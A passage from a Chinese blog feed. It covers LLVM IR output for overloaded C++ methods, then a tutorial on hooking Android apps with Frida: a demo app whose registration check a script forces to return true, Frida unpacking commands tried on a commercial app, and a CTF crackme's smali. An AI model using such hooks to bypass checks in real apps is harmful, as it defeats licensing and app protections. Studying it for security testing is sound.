0</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define linkonce_odr dso_local i32 @_ZN1A3addEii(%class.A* %this, i32 %a, i32 %b) #5 comdat align 2 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %this.addr &#x3D; alloca %class.A*, align 8</span><br><span class="line">  %a.addr &#x3D; alloca i32, align 4</span><br><span class="line">  %b.addr &#x3D; alloca i32, align 4</span><br><span class="line">  store %class.A* %this, %class.A** %this.addr, align 8</span><br><span class="line">  store i32 %a, i32* %a.addr, align 4</span><br><span class="line">  store i32 %b, i32* %b.addr, align 4</span><br><span class="line">  %this1 &#x3D; load %class.A*, %class.A** %this.addr, align 8</span><br><span class="line">  %0 &#x3D; load i32, i32* %a.addr, align 4</span><br><span class="line">  %1 &#x3D; load i32, i32* %b.addr, align 4</span><br><span class="line">  %add &#x3D; add nsw i32 %0, %1</span><br><span class="line">  ret i32 %add</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline nounwind optnone uwtable</span><br><span class="line">define linkonce_odr dso_local i32 @_ZN1A3addEiii(%class.A* %this, i32 %a, i32 %b, i32 %c) #5 comdat align 2 &#123;</span><br><span class="line">entry:</span><br><span class="line">  %this.addr &#x3D; alloca %class.A*, align 8</span><br><span class="line">  %a.addr &#x3D; alloca i32, align 4</span><br><span class="line">  %b.addr &#x3D; alloca i32, align 4</span><br><span class="line">  %c.addr &#x3D; alloca i32, align 4</span><br><span class="line">  store %class.A* %this, %class.A** %this.addr, align 8</span><br><span class="line">  store i32 %a, i32* %a.addr, align 4</span><br><span class="line">  store i32 %b, i32* %b.addr, align 4</span><br><span class="line">  store i32 %c, i32* %c.addr, align 4</span><br><span class="line">  %this1 &#x3D; load %class.A*, %class.A** %this.addr, align 8</span><br><span class="line">  %0 &#x3D; load i32, i32* %a.addr, align 4</span><br><span class="line">  %1 &#x3D; load i32, i32* %b.addr, align 4</span><br><span class="line">  %add &#x3D; add nsw i32 %0, %1</span><br><span class="line">  %2 &#x3D; load i32, i32* %c.addr, align 4</span><br><span class="line">  %add2 &#x3D; add nsw i32 %add, %2</span><br><span class="line">  ret i32 %add2</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">declare dso_local dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZStlsISt11char_traitsIcEERSt13basic_ostreamIcT_ES5_PKc(%&quot;class.std::basic_ostream&quot;* dereferenceable(272), i8*) #1</span><br><span class="line"></span><br><span class="line">declare dso_local dereferenceable(272) %&quot;class.std::basic_ostream&quot;* @_ZNSolsEi(%&quot;class.std::basic_ostream&quot;*, i32) #1</span><br><span class="line"></span><br><span class="line">; Function Attrs: noinline uwtable</span><br><span class="line">define internal void @_GLOBAL__sub_I_testclass.cpp() #0 section &quot;.text.startup&quot; &#123;</span><br><span class="line">entry:</span><br><span class="line">  call void @__cxx_global_var_init()</span><br><span class="line">  ret void</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">attributes #0 &#x3D; &#123; noinline uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #1 &#x3D; &#123; &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #2 &#x3D; &#123; nounwind &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #3 &#x3D; &#123; nounwind &#125;</span><br><span class="line">attributes #4 &#x3D; &#123; noinline norecurse optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line">attributes #5 &#x3D; &#123; noinline nounwind optnone uwtable &quot;correctly-rounded-divide-sqrt-fp-math&quot;&#x3D;&quot;false&quot; &quot;disable-tail-calls&quot;&#x3D;&quot;false&quot; &quot;less-precise-fpmad&quot;&#x3D;&quot;false&quot; &quot;no-frame-pointer-elim&quot;&#x3D;&quot;true&quot; &quot;no-frame-pointer-elim-non-leaf&quot; &quot;no-infs-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-jump-tables&quot;&#x3D;&quot;false&quot; &quot;no-nans-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-signed-zeros-fp-math&quot;&#x3D;&quot;false&quot; &quot;no-trapping-math&quot;&#x3D;&quot;false&quot; &quot;stack-protector-buffer-size&quot;&#x3D;&quot;8&quot; &quot;target-cpu&quot;&#x3D;&quot;x86-64&quot; &quot;target-features&quot;&#x3D;&quot;+fxsr,+mmx,+sse,+sse2,+x87&quot; &quot;unsafe-fp-math&quot;&#x3D;&quot;false&quot; &quot;use-soft-float&quot;&#x3D;&quot;false&quot; &#125;</span><br><span class="line"></span><br><span class="line">!llvm.module.flags &#x3D; !&#123;!0&#125;</span><br><span class="line">!llvm.ident &#x3D; !&#123;!1&#125;</span><br><span class="line"></span><br><span class="line">!0 &#x3D; !&#123;i32 1, !&quot;wchar_size&quot;, i32 4&#125;</span><br><span class="line">!1 &#x3D; !&#123;!&quot;clang version 7.0.0 (tags&#x2F;RELEASE_700&#x2F;final)&quot;&#125;</span><br></pre></td></tr></table></figure>

<p>可以发现</p>
<figure class="highlight cs"><table><tr><td class="code"><pre><span class="line"><span class="keyword">add</span>(<span class="keyword">int</span> a,<span class="keyword">int</span> b);</span><br></pre></td></tr></table></figure>

<p>生成的是：</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">define</span> <span class="keyword">linkonce_odr</span> dso_local <span class="keyword">i32</span> <span class="title">@_ZN1A3addEii</span>(<span class="symbol">%class.A</span>* <span class="symbol">%this</span>, <span class="keyword">i32</span> <span class="symbol">%a</span>, <span class="keyword">i32</span> <span class="symbol">%b</span>)</span><br></pre></td></tr></table></figure>

<p>而</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">add</span><span class="params">(<span class="keyword">int</span> a,<span class="keyword">int</span> b,<span class="keyword">int</span> c)</span></span>;</span><br></pre></td></tr></table></figure>

<p>生成的是：</p>
<figure class="highlight angelscript"><table><tr><td class="code"><pre><span class="line">define linkonce_odr dso_local i32 @_ZN1A3addEiii(%<span class="keyword">class</span>.<span class="symbol">A</span>* %<span class="symbol">this, <span class="symbol">i32</span></span> %<span class="symbol">a, <span class="symbol">i32</span></span> %<span class="symbol">b, <span class="symbol">i32</span></span> %<span class="symbol">c</span>)</span><br></pre></td></tr></table></figure>

<p>比两个参数多了一个i。</p>
<p>而且类名和函数之间用一个数字连接。</p>
]]></content>
      <categories>
        <category>程序分析</category>
      </categories>
      <tags>
        <tag>LLVM</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓测试(二)</title>
    <url>/android%E6%B5%8B%E8%AF%95/%E5%AE%89%E5%8D%93%E6%B5%8B%E8%AF%95-%E4%BA%8C/</url>
    <content><![CDATA[<p>此篇文章主要讲的是android中使用frida框架hook应用进程。</p>
<a id="more"></a>

<h1><span id="编写demo测试frida-api">编写demo测试frida api</span></h1><h2><span id="编写demo">编写demo</span></h2><p>Android Studio安装具体过程网上自行搜索。</p>
<p>笔者当前AS版本：</p>
<p><img src="/assets/image-20200607215916539.png" alt="image-20200607215916539"></p>
<p>AS连接夜神简单方法：</p>
<p><img src="/assets/image-20200607220848783.png" alt="image-20200607220848783"></p>
<p>先新建一个空activity</p>
<p><img src="/assets/image-20200607215820676.png" alt="image-20200607215820676"></p>
<p>编写程序的思路是，一个简单的注册号检验，输入正确的校验号则成功激活，否则失败。</p>
<p>绕过逻辑，hook掉判断成功失败的函数。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate(savedInstanceState);</span><br><span class="line">        setContentView(R.layout.activity_main);</span><br><span class="line">        <span class="keyword">final</span> TextView textView = (TextView)findViewById(R.id.editText_code);</span><br><span class="line">        textView.setEnabled(<span class="keyword">true</span>);</span><br><span class="line">        Button check = (Button)findViewById(R.id.button);</span><br><span class="line">        check.setOnClickListener(<span class="keyword">new</span> View.OnClickListener() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View view)</span> </span>&#123;</span><br><span class="line">                <span class="keyword">if</span>(check(textView.getText().toString()))&#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">"校验成功"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">                &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">                    Toast.makeText(MainActivity.<span class="keyword">this</span>,<span class="string">"校验失败"</span>,Toast.LENGTH_LONG).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">check</span><span class="params">(String number)</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> number.equals(<span class="string">"pass_word"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<p><img src="/assets/image-20200607223202986.png" alt="image-20200607223202986"></p>
<p>现在hook app。</p>
<p>首先生成带签名app</p>
<p><img src="/assets/image-20200607223304658.png" alt="image-20200607223304658"></p>
<h2><span id="frida测试">frida测试</span></h2><p>这里app没加壳，又有源码不用逆向，所以直接上手即可。</p>
<p>check.js代码：</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(Java.available)&#123;</span><br><span class="line">    Java.perform(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">var</span> checkMethod = Java.use(<span class="string">"blog.ydq6.demo1.MainActivity"</span>);</span><br><span class="line">        checkMethod.check.overload(<span class="string">"java.lang.String"</span>).implementation=<span class="function"><span class="keyword">function</span>(<span class="params">param</span>)</span>&#123;</span><br><span class="line">            <span class="built_in">console</span>.log(<span class="string">"修改成功;\n"</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后执行frida命令</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">frida -U -f blog.ydq6.demo1 -l F:<span class="symbol">\c</span>ode<span class="symbol">\A</span>ndroidProject<span class="symbol">\D</span>emo1<span class="symbol">\a</span>pp<span class="symbol">\h</span>ook<span class="symbol">\m</span>odifyCheck.js --no-pause</span><br></pre></td></tr></table></figure>

<p>发现还是错误。</p>
<p>参考网上教程：</p>
<figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">frida -U blog.ydq6.demo1 -l F:<span class="symbol">\c</span>ode<span class="symbol">\A</span>ndroidProject<span class="symbol">\D</span>emo1<span class="symbol">\a</span>pp<span class="symbol">\h</span>ook<span class="symbol">\m</span>odifyCheck.js</span><br></pre></td></tr></table></figure>

<p>去掉了-f –no-pause选项。</p>
<p>退出app,再重新打开，发现成功：<br><img src="/assets/image-20200607231641389.png" alt="image-20200607231641389"></p>
<p><img src="/assets/image-20200607231659556.png" alt="image-20200607231659556"></p>
<h2><span id="飞聊软件逆向分析">飞聊软件逆向分析</span></h2><p>将豌豆荚下载的飞聊apk放入jeb中反编译发现错误，猜测加了壳。</p>
<p><img src="/assets/image-20200609165516555.png" alt="image-20200609165516555"></p>
<p>放jadx发现信息出来了。</p>
<p><img src="/assets/image-20200609213830362.png" alt="image-20200609213830362"></p>
<p>很奇怪</p>
<h2><span id="frida脱壳">frida脱壳</span></h2><figure class="highlight taggerscript"><table><tr><td class="code"><pre><span class="line">adb forward tcp:27042 tcp:27042</span><br><span class="line">frida -R -f com.gaotu100.superclass -l  N:<span class="symbol">\w</span>eiyun<span class="symbol">\D</span>ocuments<span class="symbol">\s</span>ecurity<span class="symbol">\a</span>ndroid_security<span class="symbol">\f</span>rida<span class="symbol">\F</span>rida-Scripts-master<span class="symbol">\u</span>npack<span class="symbol">\u</span>npack.js</span><br></pre></td></tr></table></figure>

<p>发现没用，报错。</p>
<h2><span id="xposed脱壳">xposed脱壳</span></h2><p>由于dumpdex不支持模拟器，所以换真机演示。</p>
<h1><span id="frida-编程参考">frida 编程参考</span></h1><h1><span id="smali文件分析">smali文件分析</span></h1><p>源文件：</p>
<figure class="highlight smali"><table><tr><td class="code"><pre><span class="line"><span class="keyword">.class</span><span class="keyword"> public</span> <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span></span><br><span class="line"><span class="keyword">.super</span> <span class="class">Ljava/lang/Object;</span></span><br><span class="line"><span class="keyword">.source</span> <span class="string">"Crackme.java"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># instance fields</span></span><br><span class="line"><span class="keyword">.field</span><span class="keyword"> private</span> str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># direct methods</span></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> public</span><span class="keyword"> constructor</span> &lt;init&gt;()V</span><br><span class="line"><span class="keyword">    .locals</span> 1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 22</span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0&#125;, <span class="class">Ljava/lang/Object;</span>-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 21</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"cGhyYWNrICBjdGYgMjAxNg=="</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iput-object </span>v0, p0, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 23</span><br><span class="line">   <span class="built_in"> const-string </span>v0, <span class="string">"sSNnx1UKbYrA1+MOrdtDTA=="</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0, v0&#125;, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;GetFlag(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 24</span><br><span class="line">    return-void</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> private</span> GetFlag(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 4</span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"str"</span>    <span class="comment"># Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v3, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 27</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p1&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v2, v3&#125;, <span class="class">Landroid/util/Base64;</span>-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 29</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"content"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v1, <span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> iget-object </span>v2, p0, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;str2:<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v2, v3&#125;, <span class="class">Landroid/util/Base64;</span>-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v1, v2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;&lt;init&gt;([B)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 30</span><br><span class="line"><span class="keyword">    .local</span> v1, <span class="string">"kk"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="built_in"> sget-object </span>v2, <span class="class">Ljava/lang/System;</span>-&gt;out:<span class="class">Ljava/io/PrintStream;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;p0, v0, v1&#125;, <span class="class">Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span>-&gt;decrypt([B<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v3</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v2, v3&#125;, <span class="class">Ljava/io/PrintStream;</span>-&gt;println(<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 31</span><br><span class="line">   <span class="built_in"> const/4 </span>v2, 0x0</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> return-object </span>v2</span><br><span class="line"><span class="keyword">.end method</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">.method</span><span class="keyword"> private</span> decrypt([B<span class="class">Ljava/lang/String;</span>)<span class="class">Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .locals</span> 8</span><br><span class="line"><span class="keyword">    .param</span> p1, <span class="string">"content"</span>    <span class="comment"># [B</span></span><br><span class="line"><span class="keyword">    .param</span> p2, <span class="string">"password"</span>    <span class="comment"># Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .prologue</span></span><br><span class="line"><span class="keyword">    .line</span> 35</span><br><span class="line">   <span class="built_in"> const/4 </span>v4, 0x0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 37</span><br><span class="line"><span class="keyword">    .local</span> v4, <span class="string">"m"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="keyword"> :try_start_0</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;p2&#125;, <span class="class">Ljava/lang/String;</span>-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v3</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 38</span><br><span class="line"><span class="keyword">    .local</span> v3, <span class="string">"keyStr"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v2, <span class="class">Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> const-string </span>v7, <span class="string">"AES"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v2, v3, v7&#125;, <span class="class">Ljavax/crypto/spec/SecretKeySpec;</span>-&gt;&lt;init&gt;([B<span class="class">Ljava/lang/String;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 39</span><br><span class="line"><span class="keyword">    .local</span> v2, <span class="string">"key"</span>:<span class="class">Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line">   <span class="built_in"> const-string </span>v7, <span class="string">"AES/ECB/NoPadding"</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-static </span>&#123;v7&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;getInstance(<span class="class">Ljava/lang/String;</span>)<span class="class">Ljavax/crypto/Cipher;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 40</span><br><span class="line"><span class="keyword">    .local</span> v0, <span class="string">"cipher"</span>:<span class="class">Ljavax/crypto/Cipher;</span></span><br><span class="line">   <span class="built_in"> const/4 </span>v7, 0x2</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, v7, v2&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;init(I<span class="class">Ljava/security/Key;</span>)V</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 41</span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v0, p1&#125;, <span class="class">Ljavax/crypto/Cipher;</span>-&gt;doFinal([B)[B</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> move-result-object </span>v6</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 42</span><br><span class="line"><span class="keyword">    .local</span> v6, <span class="string">"result"</span>:[B</span><br><span class="line">   <span class="built_in"> new-instance </span>v5, <span class="class">Ljava/lang/String;</span></span><br><span class="line"></span><br><span class="line">   <span class="built_in"> invoke-direct </span>&#123;v5, v6&#125;, <span class="class">Ljava/lang/String;</span>-&gt;&lt;init&gt;([B)V</span><br><span class="line">   <span class="keyword"> :try_end_0</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljava/security/NoSuchAlgorithmException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_1</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/NoSuchPaddingException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_0</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljava/security/InvalidKeyException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_4</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/IllegalBlockSizeException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_2</span></span><br><span class="line"><span class="keyword">    .catch</span> <span class="class">Ljavax/crypto/BadPaddingException;</span> &#123;:try_start_0 ..<span class="keyword"> :try_end_0</span>&#125;<span class="keyword"> :catch_3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">    .end local</span> v4    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .local</span> v5, <span class="string">"m"</span>:<span class="class">Ljava/lang/String;</span></span><br><span class="line">   <span class="built_in"> move-object </span>v4, v5</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 46</span><br><span class="line"><span class="keyword">    .end local</span> v0    <span class="comment"># "cipher":Ljavax/crypto/Cipher;</span></span><br><span class="line"><span class="keyword">    .end local</span> v2    <span class="comment"># "key":Ljavax/crypto/spec/SecretKeySpec;</span></span><br><span class="line"><span class="keyword">    .end local</span> v3    <span class="comment"># "keyStr":[B</span></span><br><span class="line"><span class="keyword">    .end local</span> v5    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line"><span class="keyword">    .end local</span> v6    <span class="comment"># "result":[B</span></span><br><span class="line"><span class="keyword">    .restart</span> local v4    <span class="comment"># "m":Ljava/lang/String;</span></span><br><span class="line">   <span class="keyword"> :goto_0</span></span><br><span class="line">   <span class="built_in"> return-object </span>v4</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 43</span><br><span class="line">   <span class="keyword"> :catch_0</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 44</span><br><span class="line"><span class="keyword">    .local</span> v1, <span class="string">"e"</span>:<span class="class">Ljava/security/GeneralSecurityException;</span></span><br><span class="line">   <span class="keyword"> :goto_1</span></span><br><span class="line">   <span class="built_in"> invoke-virtual </span>&#123;v1&#125;, <span class="class">Ljava/security/GeneralSecurityException;</span>-&gt;printStackTrace()V</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_0</span><br><span class="line"></span><br><span class="line"><span class="keyword">    .line</span> 43</span><br><span class="line"><span class="keyword">    .end local</span> v1    <span class="comment"># "e":Ljava/security/GeneralSecurityException;</span></span><br><span class="line">   <span class="keyword"> :catch_1</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_2</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_3</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"></span><br><span class="line">   <span class="keyword"> :catch_4</span></span><br><span class="line">   <span class="built_in"> move-exception </span>v1</span><br><span class="line"></span><br><span class="line">   <span class="built_in"> goto </span>:goto_1</span><br><span class="line"><span class="keyword">.end method</span></span><br></pre></td></tr></table></figure>





<h2><span id="java类">JAVA类</span></h2><ul>
<li>perform(function) 执行函数</li>
<li>Java.use(className)  获取类名</li>
</ul>
]]></content>
      <categories>
        <category>android测试</category>
      </categories>
      <tags>
        <tag>Frida</tag>
      </tags>
  </entry>
  <entry>
    <title>安卓测试(一)</title>
